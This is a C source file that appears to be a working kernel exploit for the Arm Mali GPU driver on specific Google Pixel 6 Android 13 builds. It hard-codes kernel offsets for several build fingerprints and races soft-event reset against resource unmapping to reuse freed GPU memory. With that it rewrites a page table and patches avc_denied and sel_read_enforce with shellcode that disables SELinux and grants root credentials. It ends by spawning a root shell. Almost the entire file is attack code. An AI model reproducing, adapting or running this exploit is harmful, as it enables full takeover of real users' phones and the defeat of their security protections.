#define _GNU_SOURCE

#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include "stdbool.h"
#include <sys/syscall.h>
#include <stdint.h>
#include <pthread.h>
#include <sched.h>
#include <sys/time.h>
#include <sys/epoll.h>
#include <sys/eventfd.h>
#include <sys/timerfd.h>
#include <ctype.h>
#include <linux/aio_abi.h>
#include <sys/system_properties.h>

#include "mali.h"
#include "mali_base_jm_kernel.h"
#include "mempool_utils.h"
#include "mem_write.h"

#define MALI "/dev/mali0"

#define PAGE_SHIFT 12

#define BASE_MEM_ALIAS_MAX_ENTS ((size_t)24576)

#define RESERVED_SIZE 32

#define TOTAL_RESERVED_SIZE 1024

#define PFN_DOWN(x)	((x) >> PAGE_SHIFT)

#define UNMAP_CPU 1

#define UPDATE_CPU 0

#define WAIT_CPU 2

#define NB_PREEMPT_THREAD 32

#define NR_WATCHES 100 //5000
#define NR_EPFDS 500

#define TEST_ENT 3

#define NSEC_PER_SEC 1000000000UL

#define DEFAULT_WAIT 505

#define CORRUPTED_VA_SIZE 500

#define CORRUPTED_COMMIT_SIZE 10

#define AVC_DENY_2211 0x8d6810

#define SEL_READ_ENFORCE_2211 0x8ea124

#define INIT_CRED_2211 0x2fd1388

#define COMMIT_CREDS_2211 0x17ada4

#define ADD_INIT_2211 0x910e2000 //add x0, x0, #0x388

#define ADD_COMMIT_2211 0x91369108 //add x8, x8, #0xda4

#define AVC_DENY_2212 0x8ba710

#define SEL_READ_ENFORCE_2212 0x8cdfd4

#define INIT_CRED_2212 0x2fd1418

#define COMMIT_CREDS_2212 0x177ee4

#define ADD_INIT_2212 0x91106000 //add x0, x0, #0x418

#define ADD_COMMIT_2212 0x913b9108 //add x8, x8, #0xee4

#define AVC_DENY_2301 0x8ba710

#define SEL_READ_ENFORCE_2301 0x8cdfd4

#define INIT_CRED_2301 0x2fd1418

#define COMMIT_CREDS_2301 0x177ee4

#define ADD_INIT_2301 0x91106000 //add x0, x0, #0x418

#define ADD_COMMIT_2301 0x913b9108 //add x8, x8, #0xee4

static uint64_t sel_read_enforce = SEL_READ_ENFORCE_2211;

static uint64_t avc_deny = AVC_DENY_2211;

static uint32_t permissive[3] = {0x3900001f, 0xd2800000,0xd65f03c0};

static uint32_t root_code[8] = {0};

static uint64_t uevent;
static uint8_t atom_number = 0;
static volatile int g_ready_unmap = 0;
static struct timespec unmap_time;
static struct timespec finished_fault_time;
static uint8_t g_initial_read = TEST_ENT;
static int need_reset_fd = 0;
static volatile bool success = false;
static int error_code = 0;
static struct timespec finished_reset_time;
static uint64_t reserved[TOTAL_RESERVED_SIZE/RESERVED_SIZE];
static uint64_t corrupted_region = 0;
static uint64_t benchmark_time = DEFAULT_WAIT;
static uint64_t this_benchmark_time = 0;

#define OFF 4

#define SYSCHK(x) ({          \
  typeof(x) __res = (x);      \
  if (__res == (typeof(x))-1) \
    err(1, "SYSCHK(" #x ")"); \
  __res;                      \
})


void select_offset() {
  char fingerprint[256];
  int len = __system_property_get("ro.build.fingerprint", fingerprint);
  LOG("fingerprint: %s\n", fingerprint);
  if (!strcmp(fingerprint, "google/oriole/oriole:13/TP1A.221105.002/9080065:user/release-keys")) {
    avc_deny = AVC_DENY_2211;
    sel_read_enforce = SEL_READ_ENFORCE_2211;
    fixup_root_shell(INIT_CRED_2211, COMMIT_CREDS_2211, SEL_READ_ENFORCE_2211, ADD_INIT_2211, ADD_COMMIT_2211, &(root_code[0]));
    return;
  }
  if (!strcmp(fingerprint, "google/oriole/oriole:13/TQ1A.221205.011/9244662:user/release-keys")) {
    avc_deny = AVC_DENY_2212;
    sel_read_enforce = SEL_READ_ENFORCE_2212;
    fixup_root_shell(INIT_CRED_2212, COMMIT_CREDS_2212, SEL_READ_ENFORCE_2212, ADD_INIT_2212, ADD_COMMIT_2212, &(root_code[0]));
    return;
  }
  if (!strcmp(fingerprint, "google/oriole/oriole:13/TQ1A.230105.002/9325679:user/release-keys")) {
    avc_deny = AVC_DENY_2301;
    sel_read_enforce = SEL_READ_ENFORCE_2301;
    fixup_root_shell(INIT_CRED_2301, COMMIT_CREDS_2301, SEL_READ_ENFORCE_2301, ADD_INIT_2301, ADD_COMMIT_2301, &(root_code[0]));
    return;
  }

  err(1, "unable to match build id\n");
}

static  int io_setup(unsigned nr, aio_context_t *ctxp)
{
	return syscall(__NR_io_setup, nr, ctxp);
}

static int io_destroy(aio_context_t ctx) 
{
	return syscall(__NR_io_destroy, ctx);
}

void epoll_add(int epfd, int fd) {
  struct epoll_event ev = { .events = EPOLLIN };
  SYSCHK(epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev));
}

struct timespec get_mono_time(void) {
  struct timespec ts;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &ts));
  return ts;
}

inline unsigned long timespec_to_ns(struct timespec ts) {
  return ts.tv_sec * NSEC_PER_SEC + ts.tv_nsec;
}

void ts_sub(struct timespec *ts, unsigned long nsecs) {
  if (ts->tv_nsec < nsecs) {
    ts->tv_sec--;
    ts->tv_nsec += NSEC_PER_SEC;
  }
  ts->tv_nsec -= nsecs;
}
void ts_add(struct timespec *ts, unsigned long nsecs) {
  ts->tv_nsec += nsecs;
  if (ts->tv_nsec >= NSEC_PER_SEC) {
    ts->tv_sec++;
    ts->tv_nsec -= NSEC_PER_SEC;
  }
}
bool ts_is_in_future(struct timespec ts) {
  struct timespec cur = get_mono_time();
  if (ts.tv_sec > cur.tv_sec)
    return true;
  if (ts.tv_sec < cur.tv_sec)
    return false;
  return ts.tv_nsec > cur.tv_nsec;
}

void setup_timerfd() {
  int tfd = SYSCHK(timerfd_create(CLOCK_MONOTONIC, 0));
  int tfd_dups[NR_WATCHES];
  for (int i=0; i<NR_WATCHES; i++)
    tfd_dups[i] = SYSCHK(dup(tfd));

  int epfds[NR_EPFDS];
  for (int i=0; i<NR_EPFDS; i++)
    epfds[i] = SYSCHK(epoll_create1(0));

  for (int i=0; i<NR_EPFDS; i++) {
    for (int j=0; j<NR_WATCHES; j++)
      epoll_add(epfds[i], tfd_dups[j]);
  }  
}

int migrate_to_cpu(int i)
{
    cpu_set_t cpu;
    CPU_ZERO(&cpu);
    CPU_SET(i, &cpu);
    
    int res = sched_setaffinity(0, sizeof(cpu), &cpu);
    if (res)
    {
        LOG("Error in the setaffinity %d\n", i);
        return -1;
    }
    return 0;
}

struct base_mem_handle {
	struct {
		__u64 handle;
	} basep;
};

struct base_mem_aliasing_info {
	struct base_mem_handle handle;
	__u64 offset;
	__u64 length;
};

static int open_dev(char* name) {
  int fd = open(name, O_RDWR);
  if (fd == -1) {
    err(1, "cannot open %s\n", name);
  }
  return fd;
}

void setup_mali(int fd, int group_id) {
  struct kbase_ioctl_version_check param = {0};
  if (ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &param) < 0) {
    err(1, "version check failed\n");
  }
  struct kbase_ioctl_set_flags set_flags = {group_id << 3};
  if (ioctl(fd, KBASE_IOCTL_SET_FLAGS, &set_flags) < 0) {
    err(1, "set flags failed\n");
  }
}

void* setup_tracking_page(int fd) {
  void* region = mmap(NULL, 0x1000, 0, MAP_SHARED, fd, BASE_MEM_MAP_TRACKING_HANDLE);
  if (region == MAP_FAILED) {
    err(1, "setup tracking page failed");
  }
  return region;
}

uint64_t map_resource_job(int mali_fd, uint8_t atom_number, uint64_t gpu_addr) {
  struct base_jd_atom_v2 atom = {0};
  void* jc_region = map_gpu(mali_fd, 1, 1, false, 0);

  struct base_external_resource extres = {
    .ext_resource = gpu_addr
  };
  atom.atom_number = atom_number;
  atom.core_req = BASE_JD_REQ_EXTERNAL_RESOURCES | BASE_JD_REQ_SOFT_EVENT_WAIT;
  atom.extres_list = (uint64_t)(&extres);
  atom.nr_extres = 1;
  atom.jc = (uint64_t)jc_region;
  struct kbase_ioctl_job_submit submit = {0};
  submit.addr = (uint64_t)(&atom);
  submit.nr_atoms = 1;
  submit.stride = sizeof(struct base_jd_atom_v2);
  if (ioctl(mali_fd, KBASE_IOCTL_JOB_SUBMIT, &submit) < 0) {
    err(1, "map resource job failed\n");
  }
  return (uint64_t)jc_region;
}

void release_resource_job(int mali_fd, uint8_t atom_number, uint64_t jc) {
  struct base_jd_atom_v2 atom = {0}; 
  atom.atom_number = atom_number;
  atom.core_req = BASE_JD_REQ_SOFT_EVENT_SET;
  atom.jc = jc;
  struct kbase_ioctl_job_submit submit = {0};
  submit.addr = (uint64_t)(&atom);
  submit.nr_atoms = 1;
  submit.stride = sizeof(struct base_jd_atom_v2);
  if (ioctl(mali_fd, KBASE_IOCTL_JOB_SUBMIT, &submit) < 0) {
    err(1, "release resource job failed\n");
  }

}

void mem_alias(int fd, union kbase_ioctl_mem_alias* alias) {
  if (ioctl(fd, KBASE_IOCTL_MEM_ALIAS, alias) < 0) {
    err(1, "mem_alias failed\n");
  }
}

void mem_query(int fd, union kbase_ioctl_mem_query* query) {
  if (ioctl(fd, KBASE_IOCTL_MEM_QUERY, query) < 0) {
    err(1, "mem_query failed\n");
  }
}

void mem_commit(int fd, uint64_t gpu_addr, uint64_t pages) {
  struct kbase_ioctl_mem_commit commit = {.gpu_addr = gpu_addr, pages = pages};
  if (ioctl(fd, KBASE_IOCTL_MEM_COMMIT, &commit) < 0) {
    err(1, "mem_commit failed\n");
  }
}

uint64_t mem_import(int mali_fd, uint64_t region) {
  struct base_mem_import_user_buffer ubuf = {
    .ptr = region,
    .length = 0x1000
  };
  union kbase_ioctl_mem_import mi = {
    .in = {
      .flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR |BASE_MEM_CACHED_CPU,
      .phandle = (uint64_t)&ubuf,
      .type = BASE_MEM_IMPORT_TYPE_USER_BUFFER
    }
  };
  if (ioctl(mali_fd, KBASE_IOCTL_MEM_IMPORT, &mi) < 0) {
    err(1, "mem_import failed %lx\n", region);
  }
  return mi.out.gpu_va;
}

void map_external_resource(int mali_fd, uint64_t gpu_addr) {
  uint64_t addr = gpu_addr;
  struct kbase_ioctl_sticky_resource_map map_param;
  map_param.count = 1;
  map_param.address = (uint64_t)(&addr);
  if (ioctl(mali_fd, KBASE_IOCTL_STICKY_RESOURCE_MAP, &map_param) < 0) {
    err(1, "map external resource failed\n");
  }
}

void unmap_external_resource(int mali_fd, uint64_t gpu_addr) {
  uint64_t addr = gpu_addr;
  struct kbase_ioctl_sticky_resource_unmap unmap_param;
  unmap_param.count = 1;
  unmap_param.address = (uint64_t)(&addr);
  if (ioctl(mali_fd, KBASE_IOCTL_STICKY_RESOURCE_UNMAP, &unmap_param) < 0) {
    err(1, "unmap external resource failed\n");
  }
}

bool before(struct timespec* t1, struct timespec* t2) {
  if (t1->tv_sec < t2->tv_sec) return true;
  if (t1->tv_sec > t2->tv_sec) return false;
  return t1->tv_nsec < t2->tv_nsec;
}

bool before_reset() {
  return finished_reset_time.tv_sec == 0 || before(&finished_fault_time, &finished_reset_time);
}

void* unmap_resources(void* args) {
  uint64_t* arguments = (uint64_t*)args;
  int mali_fd = (int)(arguments[0]);

  migrate_to_cpu(UNMAP_CPU);
  struct kbase_ioctl_mem_free mem_free = {.gpu_addr = (64ul << 12) + 0x1000};

  while (!g_ready_unmap);
  while (ts_is_in_future(unmap_time));
  migrate_to_cpu(UNMAP_CPU);
  g_initial_read = *(volatile uint8_t*)(uevent + OFF);
  if (g_initial_read != TEST_ENT) return NULL;
  ioctl(mali_fd, KBASE_IOCTL_MEM_FREE, &mem_free);
  finished_fault_time = get_mono_time();
  if (!before_reset()) return NULL;
//  LOG("finished reset time %ld %ld fault time %ld %ld\n", finished_reset_time.tv_sec, finished_reset_time.tv_nsec, finished_fault_time.tv_sec, finished_fault_time.tv_nsec);
  unmap_external_resource(mali_fd, uevent);
  corrupted_region = (uint64_t)map_gpu(mali_fd, CORRUPTED_VA_SIZE, CORRUPTED_COMMIT_SIZE, false, 1);
  
//  struct timespec time_now = get_mono_time();
//  LOG("finished reset time: %ld %ld, finished map time: %ld %ld\n", finished_reset_time.tv_sec, finished_reset_time.tv_nsec, time_now.tv_sec, time_now.tv_nsec);
  return NULL;
}

void check_success() {
  if (error_code != 0 || g_initial_read != TEST_ENT) return;
  if (finished_fault_time.tv_sec == 0) return;
  if (finished_reset_time.tv_sec < finished_fault_time.tv_sec) return;
  if (finished_reset_time.tv_sec > finished_fault_time.tv_sec) {
    success = 1;
    return;
  }
  if (finished_reset_time.tv_sec == finished_fault_time.tv_sec) {
    if (finished_reset_time.tv_nsec > finished_fault_time.tv_nsec) {
      success = 1;
      return;
    }
  }
  return;
}

void* softjob_reset(void* arg) {
  uint64_t* arguments = (uint64_t*)arg;
  uint64_t benchmark = arguments[1];
  struct timespec start_benchmark_time;
  struct kbase_ioctl_soft_event_update update= {0};
  update.event = benchmark ? 0 : uevent + OFF;
  update.new_status = 0;

  int tfd = SYSCHK(timerfd_create(CLOCK_MONOTONIC, 0));
  int tfd_dups[NR_WATCHES];
  for (int i=0; i<NR_WATCHES; i++)
    tfd_dups[i] = SYSCHK(dup(tfd));

  int epfds[NR_EPFDS];
  for (int i=0; i<NR_EPFDS; i++)
    epfds[i] = SYSCHK(epoll_create1(0));

  for (int i=0; i<NR_EPFDS; i++) {
    for (int j=0; j<NR_WATCHES; j++)
      epoll_add(epfds[i], tfd_dups[j]);
  }  

  migrate_to_cpu(UPDATE_CPU);

  struct timespec base_time = get_mono_time();

  struct itimerspec its = { .it_value = base_time };
  
  ts_add(&its.it_value, (uint64_t)1000 * (uint64_t)10000);

  struct timespec my_launch_ts = its.it_value;
  uint64_t wait_time = benchmark ? DEFAULT_WAIT : (benchmark_time * 110)/100;
  ts_sub(&my_launch_ts, 100 * wait_time);
  ts_sub(&my_launch_ts, 100 * DEFAULT_WAIT);
  unmap_time = its.it_value;
  ts_add(&unmap_time, 1000 * 5000);

  if (!benchmark) {
    g_ready_unmap = 1;
    SYSCHK(timerfd_settime(tfd, TFD_TIMER_ABSTIME, &its, NULL));
  }
  while (ts_is_in_future(my_launch_ts));
  if (benchmark) {
    start_benchmark_time = get_mono_time();
  }
  error_code = ioctl(arguments[0], KBASE_IOCTL_SOFT_EVENT_UPDATE, &update);
  
  finished_reset_time = get_mono_time();
  if (benchmark) {
    this_benchmark_time = (finished_reset_time.tv_sec - start_benchmark_time.tv_sec) * NSEC_PER_SEC + finished_reset_time.tv_nsec - start_benchmark_time.tv_nsec;
  }
  close(tfd);
  for (int i = 0; i < NR_WATCHES; i++) {
    close(tfd_dups[i]);
  }
  for (int i = 0; i < NR_EPFDS; i++) {
    close(epfds[i]);
  }
  return NULL;
}

uint64_t access_free_pages(int mali_fd, int mali_fd2, uint64_t corrupted_region) {
  memset((void*)corrupted_region, 0, 0x1000 * CORRUPTED_COMMIT_SIZE);
  union kbase_ioctl_mem_alias alias = {0};
  alias.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_WR;
  alias.in.stride = CORRUPTED_COMMIT_SIZE;

  alias.in.nents = 1;
  struct base_mem_aliasing_info ai;
  ai.handle.basep.handle = corrupted_region;
  ai.length = CORRUPTED_COMMIT_SIZE;
  ai.offset = 0;
  alias.in.aliasing_info = (uint64_t)(&ai);
  mem_alias(mali_fd, &alias);
  void* alias_region = mmap(NULL, 0x1000 * CORRUPTED_COMMIT_SIZE, PROT_READ, MAP_SHARED, mali_fd,  alias.out.gpu_va);
  if (alias_region == MAP_FAILED) {
    err(1, "mmap alias failed\n");
  }
  *(volatile char*)alias_region;
  uint64_t drain = drain_mem_pool(mali_fd);
  release_mem_pool(mali_fd, drain);
  mem_commit(mali_fd, corrupted_region, 0);
  map_reserved(mali_fd2, RESERVED_SIZE, TOTAL_RESERVED_SIZE/RESERVED_SIZE, &(reserved[0]));

  return (uint64_t)alias_region;
}

void reset() {
  g_ready_unmap = 0;
  g_initial_read = TEST_ENT;
  success = 0;
  error_code = 0;
  finished_reset_time.tv_sec = 0;
  finished_reset_time.tv_nsec = 0;
  need_reset_fd = 0;
}

uint8_t write_shellcode(int mali_fd, int mali_fd2, uint64_t pgd, uint64_t* reserved) {
  uint64_t avc_deny_addr = (((avc_deny + KERNEL_BASE) >> PAGE_SHIFT) << PAGE_SHIFT)| 0x443;
  write_to(mali_fd, pgd + OVERWRITE_INDEX * sizeof(uint64_t), avc_deny_addr, atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);

  usleep(100000);
  //Go through the reserve pages addresses to write to avc_denied with our own shellcode
  atom_number = write_func(mali_fd2, avc_deny, reserved, TOTAL_RESERVED_SIZE/RESERVED_SIZE, &(permissive[0]), sizeof(permissive)/sizeof(uint32_t), RESERVED_SIZE, atom_number);

  //Triggers avc_denied to disable SELinux
  open("/dev/kmsg", O_RDONLY);

  uint64_t sel_read_enforce_addr = (((sel_read_enforce + KERNEL_BASE) >> PAGE_SHIFT) << PAGE_SHIFT)| 0x443;
  write_to(mali_fd, pgd + OVERWRITE_INDEX * sizeof(uint64_t), sel_read_enforce_addr, atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);

  //Call commit_creds to overwrite process credentials to gain root
  atom_number = write_func(mali_fd2, sel_read_enforce, reserved, TOTAL_RESERVED_SIZE/RESERVED_SIZE, &(root_code[0]), sizeof(root_code)/sizeof(uint32_t), RESERVED_SIZE, atom_number);
  return atom_number;
}

int find_pgd(uint64_t* gpu_addr, int* index) {
  int ret = -1;
  for (int pg = 0; pg < CORRUPTED_COMMIT_SIZE; pg++) {
	for (int i = 0; i < 0x1000/8; i++) {
	  uint64_t entry = gpu_addr[pg * 0x1000/8 + i];
	  if ((entry & 0x443) == 0x443) {
        *index = i;
		return pg;
	  }
	}
  }
  return ret;
}

uint64_t benchmark() {
  uint64_t time = 0;
  int num_average = 30;
  uint64_t arguments[2];
  int benchmark_fd = open_dev(MALI);
  setup_mali(benchmark_fd, 0);
  void* tracking_page2 = setup_tracking_page(benchmark_fd);
  arguments[0] = benchmark_fd;
  arguments[1] = 1;
  for (int i = 0; i < num_average; i++) {
    softjob_reset(&(arguments[0]));
    time += this_benchmark_time/100;
  }
  printf("benchmark_time %ld\n", time/num_average);
  close(benchmark_fd);
  return time/num_average;
}

int trigger(int mali_fd2) {

  int mali_fd = open_dev(MALI);
  setup_mali(mali_fd, 0);
  void* tracking_page = setup_tracking_page(mali_fd);

  aio_context_t ctx = 0;
  uint32_t nr_events = 128;
  int ret = io_setup(nr_events, &ctx);
  if (ret < 0) err(1, "io_setup error\n");
  char* anon_mapping = (char*)ctx;

  migrate_to_cpu(WAIT_CPU);
  *(volatile char *)(anon_mapping + OFF) = TEST_ENT;


  uint64_t this_addr = (uint64_t)anon_mapping;
  uint64_t imported_address = mem_import(mali_fd, this_addr);
  void *gpu_mapping = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE,
      MAP_SHARED, mali_fd, imported_address);
  if (gpu_mapping == MAP_FAILED) {
    err(1, "gpu mapping failed\n");
  }
  uint64_t jc = map_resource_job(mali_fd, atom_number++, (uint64_t)gpu_mapping);
  map_external_resource(mali_fd, (uint64_t)gpu_mapping);
  release_resource_job(mali_fd, atom_number++, jc);
  uevent = (uint64_t)gpu_mapping;

  if (io_destroy(ctx) < 0) err(1, "unable to destroy aio ctx\n");

  pthread_t thread;
  uint64_t args[2];
  args[0] = mali_fd;
  args[1] = 0;

  pthread_create(&thread, NULL, &unmap_resources, (void*)&(args[0]));
  pthread_t thread1;
  pthread_create(&thread1, NULL, softjob_reset, (void*)&(args[0]));
  struct sched_param sched_par = {0};
  pthread_join(thread1, NULL);
  pthread_join(thread, NULL);
  check_success();

  if (success) {
    LOG("finished reset: %ld fault: %ld %ld err %d read %d\n", finished_reset_time.tv_nsec, finished_fault_time.tv_nsec, finished_fault_time.tv_sec, error_code, g_initial_read);

    uint64_t alias_region = access_free_pages(mali_fd, mali_fd2, corrupted_region);
    int index = 0;
    int pg = find_pgd((uint64_t*)alias_region, &index);
    if (pg != -1) {
      LOG("found pgd at page %d\n", pg);
    } else {
      LOG("failed to find pgd, retry\n");
      success = 0;
      need_reset_fd = 1;
      close(mali_fd);
      return 0;
    }
    uint64_t pgd = alias_region + pg * 0x1000;
    atom_number = write_shellcode(mali_fd, mali_fd2, pgd, &(reserved[0]));
    run_enforce();
    cleanup(mali_fd, pgd, atom_number++);
    return 1;
  }
  close(mali_fd);
  return 0;
}

int reset_mali2(int prev) {
  if (prev != -1) close(prev);
  int mali_fd2 = open_dev(MALI);
  setup_mali(mali_fd2, 1);
  void* tracking_page2 = setup_tracking_page(mali_fd2);
  reserve_pages(mali_fd2, RESERVED_SIZE, TOTAL_RESERVED_SIZE/RESERVED_SIZE, &(reserved[0]));
  return mali_fd2;
}

int main() {
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);
  uint64_t counter = 0;
  select_offset();
  int mali_fd2 = reset_mali2(-1);
  benchmark_time = benchmark();
  while (!success) {
    reset();
    int ret = trigger(mali_fd2);
    counter++;
    if (counter % 100 == 0) {
      LOG("failed after %ld\n", counter);
    }
    if (counter % 300 == 0) {
      benchmark_time = benchmark();
    }
    if (!success && need_reset_fd) {
      mali_fd2 = reset_mali2(mali_fd2);
    }
    if (ret == 1) system("sh");
  }
  LOG("success after %ld\n", counter);
}
